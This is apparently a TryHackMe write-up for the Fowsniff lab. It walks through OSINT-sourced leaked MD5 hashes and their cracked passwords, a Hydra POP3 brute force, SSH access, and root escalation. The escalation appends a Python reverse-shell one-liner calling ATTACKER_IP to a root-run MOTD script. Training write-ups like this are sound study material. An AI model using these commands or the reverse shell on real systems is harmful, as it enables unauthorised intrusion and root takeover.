# Fowsniff CTF — TryHackMe Writeup

## Overview

| Detail       | Info                          |
|--------------|-------------------------------|
| Platform     | TryHackMe                     |
| Room         | Fowsniff CTF                  |
| Difficulty   | Easy                          |
| Skills       | OSINT, Hash Cracking, POP3 Enumeration, Privilege Escalation |
| Tools Used   | Nmap, Hydra, Netcat, CrackStation |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

Results revealed **4 open ports**:

| Port | Service | Version                  | Notes                          |
|------|---------|--------------------------|--------------------------------|
| 22   | SSH     | OpenSSH 7.2p2 (Ubuntu)   | Requires credentials           |
| 80   | HTTP    | Apache 2.4.18 (Ubuntu)   | Corporate website              |
| 110  | POP3    | Dovecot pop3d             | Supports SASL(PLAIN)           |
| 143  | IMAP    | Dovecot imapd             | Supports AUTH=PLAIN            |

---

## Enumeration

### Web Server (Port 80)

The website displayed a notice stating that Fowsniff Corp suffered a **data breach** exposing employee usernames and passwords. It also mentioned that the company's official **Twitter account (@fowsniffcorp)** had been hijacked by the attackers.

### OSINT — Twitter & Pastebin

Following the trail from the website:

1. Located the `@fowsniffcorp` Twitter account.
2. Found a **Pastebin link** posted by the attackers containing leaked employee credentials.

The leak contained **9 email:MD5 hash pairs**:

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

---

## Hash Cracking

Using [CrackStation](https://crackstation.net/), 8 out of 9 MD5 hashes were cracked instantly:

| Username  | Password     | Status   |
|-----------|-------------|----------|
| mauer     | mailcall    | Cracked  |
| mustikka  | bilbo101    | Cracked  |
| tegel     | apples01    | Cracked  |
| baksteen  | skyler22    | Cracked  |
| seina     | scoobydoo2  | Cracked  |
| stone     | —           | Not Found |
| mursten   | carp4ever   | Cracked  |
| parede    | orlando12   | Cracked  |
| sciana    | 07011972    | Cracked  |

> MD5 without salt is trivially weak — all cracked passwords were simple dictionary words or common patterns.

---

## POP3 Brute Force

With the cracked credentials, Hydra was used to brute-force the POP3 service:

```bash
hydra -L users.txt -P passwords.txt <TARGET_IP> pop3
```

**Valid credentials found:** `seina:scoobydoo2`

---

## Reading Email

Connected to POP3 and retrieved emails:

```bash
nc <TARGET_IP> 110
USER seina
PASS scoobydoo2
LIST
RETR 1
```

The inbox contained an **urgent security email from `stone@fowsniff`** sent to all employees. The message included a **temporary SSH password** for all staff:

```
S1ck3nBluff+secureshell
```

---

## Initial Access — SSH

The email sender was `stone`, but that account didn't work with the temp password. However, `baksteen` (one of the recipients) had **not changed the temporary password**:

```bash
ssh baksteen@<TARGET_IP>
# Password: S1ck3nBluff+secureshell
```

Successfully logged in as `baksteen` (uid=1004, group=users).

---

## Privilege Escalation

### Finding Group-Writable Files

Searched for files owned by the `users` group:

```bash
find / -group users -type f 2>/dev/null
```

Key finding: **`/opt/cube/cube.sh`** — a shell script writable by the `users` group.

### MOTD Exploitation

Inspecting `/etc/update-motd.d/` revealed that `cube.sh` is executed as part of the **Message of the Day (MOTD)** scripts. These scripts run as **root** every time a user logs in via SSH.

### Attack Chain

**1. Inject reverse shell into `cube.sh`:**

```bash
echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-p\"])'" >> /opt/cube/cube.sh
```

**2. Start listener on attacker machine:**

```bash
nc -lvnp 4444
```

**3. Trigger by opening a new SSH session:**

```bash
ssh baksteen@<TARGET_IP>
```

The MOTD scripts execute `cube.sh` as root → reverse shell connects back → **root access obtained**.

```
$ whoami
root
```

---

## Summary — Attack Path

```
OSINT (Twitter/Pastebin)
    │
    ▼
Leaked MD5 Hashes
    │
    ▼
CrackStation → 8/9 Passwords Cracked
    │
    ▼
Hydra POP3 Brute Force → seina:scoobydoo2
    │
    ▼
POP3 Email → Temporary SSH Password
    │
    ▼
SSH as baksteen
    │
    ▼
Group-writable cube.sh + MOTD execution as root
    │
    ▼
Reverse Shell → ROOT
```

---

## Key Takeaways

- **Weak hashing (MD5 without salt)** makes credential dumps trivially exploitable.
- **Password reuse and failure to rotate** temporary credentials enabled lateral movement.
- **Sensitive information in plaintext emails** (SSH passwords) is a critical operational security failure.
- **World/group-writable scripts executed by privileged processes** (MOTD) are a common misconfiguration leading to privilege escalation.
